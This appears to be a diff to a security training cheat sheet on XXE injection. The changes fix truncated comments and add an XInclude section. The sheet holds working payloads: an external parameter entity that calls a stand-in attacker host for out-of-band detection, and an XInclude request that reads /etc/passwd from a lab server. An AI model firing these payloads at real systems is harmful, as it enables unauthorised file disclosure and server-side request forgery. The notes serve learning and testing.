@@ -35,7 +35,7 @@ Connection: close
 ### <mark style="color:purple;">Exploiting XXE to perform SSRF attacks</mark>
 
 ```
-// Edit HTTP request with "BurpSuit P
+// Edit HTTP request with "BurpSuit Proxy"
 
 POST /web/path HTTP/1.1
 Host: test.net
@@ -50,7 +50,7 @@ Connection: close
 Does not return the values of any defined external entities within its responses.
 
 ```
-// Edit HTTP request with "BurpSuit P
+// Edit HTTP request with "BurpSuit Proxy"
 // Detecting: DNS lookup and HTTP request (with Burp Collaborator client)
 
 POST /web/path HTTP/1.1
@@ -62,7 +62,7 @@ Connection: close
 ```
 
 ```
-// Edit HTTP request with "BurpSuit P
+// Edit HTTP request with "BurpSuit Proxy"
 // Detecting: DNS lookup and HTTP request (with Burp Collaborator client) + + XML parameter entity
 
 POST /web/path HTTP/1.1
@@ -71,4 +71,23 @@ Host: test.net
 Connection: close
 
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.attacker.com"> %xxe; ]> <MainTag><VulTag>&xxe;</VulTag></MainTag>
+```
+
+## <mark style="color:red;">Finding hidden attack surface for XXE injection</mark>
+
+### <mark style="color:green;">XInclude attacks</mark>
+
+Some applications receive client-submitted data, embed it on the server-side into an XML document like: backend SOAP service.
+
+"XInclude" is a part of the XML specification that allows an XML document to be built from sub-documents.
+
+```
+// Edit HTTP request with "BurpSuit Proxy"
+POST /product/stock HTTP/1.1
+Host: web-security-academy.net
+...
+Connection: close
+
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo> &storeId=1
 ```
